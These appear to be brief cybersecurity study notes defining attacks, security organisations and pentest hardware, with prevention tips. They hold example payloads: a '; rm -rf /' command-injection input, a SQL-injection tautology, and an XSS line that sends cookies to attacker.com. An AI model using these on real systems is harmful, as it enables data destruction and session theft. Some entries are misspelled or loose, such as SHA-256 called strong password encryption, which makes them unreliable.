Cybersecurity Notes – Mixed Topics
1. Villan Framework
Definition: Open-source penetration testing & red-teaming framework.

Purpose: Automates post-exploitation tasks like persistence, lateral movement, and privilege escalation.

Features:

Modular plugins

Remote access & control

Payload generation

2. OWASP.in
OWASP: Open Web Application Security Project — a global nonprofit improving software security.

Website: owasp.org (India chapter: owasp.in)

Focus: Awareness, tools, and best practices for secure coding.

Famous for: OWASP Top 10 — list of most critical web application vulnerabilities.

3. Command Injection
Definition: Exploiting applications by injecting OS-level commands.

Example:

bash
Copy
Edit
; rm -rf /
Risks: Full system compromise.

Prevention:

Input validation

Parameterized functions

Least privilege execution

4. SQL Injection (SQLi)
Definition: Injecting malicious SQL queries into input fields.

Example:

sql
Copy
Edit
' OR '1'='1
Risks: Database access, data theft, modification.

Prevention:

Prepared statements

Stored procedures

Escaping user input

5. Session Hijacking
Definition: Taking over a valid user session by stealing cookies or tokens.

Methods:

Cross-Site Scripting (XSS)

Session fixation

Network sniffing

Prevention:

HTTPS everywhere

Secure cookie flags

Regenerate session IDs on login

6. Broken Access Control
Definition: Improper restriction of user access to resources.

Examples:

IDOR (Insecure Direct Object References)

Missing role checks

Prevention:

Enforce role-based access

Server-side checks (never trust client-side validation)

7. Cryptographic Failures
Definition: Improper use or absence of encryption for sensitive data.

Examples:

Storing passwords in plain text

Weak algorithms (MD5, SHA1)

Prevention:

Strong encryption (AES-256, SHA-256)

Use salts and key management

8. Man-in-the-Middle (MITM)
Definition: Attacker intercepts communication between two parties.

Techniques:

ARP spoofing

DNS spoofing

Rogue Wi-Fi AP

Prevention:

TLS/SSL encryption

VPN usage

Certificate pinning

9. QuillBot
Definition: AI-based paraphrasing & writing tool.

Use in Cybersecurity: Can be used to rewrite phishing emails or bypass plagiarism detection — making it a potential social engineering aid.

10. "Last Door" Sites (Job Portals)
Examples: Naukri.com, LinkedIn.

Risks:

Phishing via fake job postings.

Data harvesting from resumes.

Precautions:

Verify recruiters.

Avoid sharing sensitive personal data.

11. JavaScript Payload
Definition: Malicious JS code injected to exploit XSS or other client-side vulnerabilities.

Example:

javascript
Copy
Edit
<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>
Prevention:

Output encoding

Content Security Policy (CSP)

12. White Cards / SQL Dump
White Cards: Blank magnetic stripe/EMV cards used for cloning payment cards.

SQL Dump: Export of a database’s structure and data, often leaked during breaches.

13. Insecure Design
Definition: Weak security architecture from the start.

Examples:

No 2FA support

Storing sensitive data without encryption

Solution: Threat modeling & security reviews during the design phase.

14. Android 10 & 11 Names
Android 10: No dessert name (Google stopped dessert naming publicly).

Android 11: Same, internal code names exist (e.g., “Red Velvet Cake”).

15. Flipper
Flipper Zero: Portable multi-tool for pentesters.

Capabilities:

RFID/NFC cloning

Radio frequency sniffing

Infrared signal capture

16. Hack5
Company: Creates penetration testing hardware/tools.

Popular Products:

USB Rubber Ducky (keystroke injection)

WiFi Pineapple (wireless attacks)

Packet Squirrel (network sniffing)

17. Wi-Fi Adapters
Purpose in Security: Required for wireless network attacks.

Key Feature: Monitor mode & packet injection support.

Popular Chipsets: Atheros AR9271, Realtek RTL8812AU.
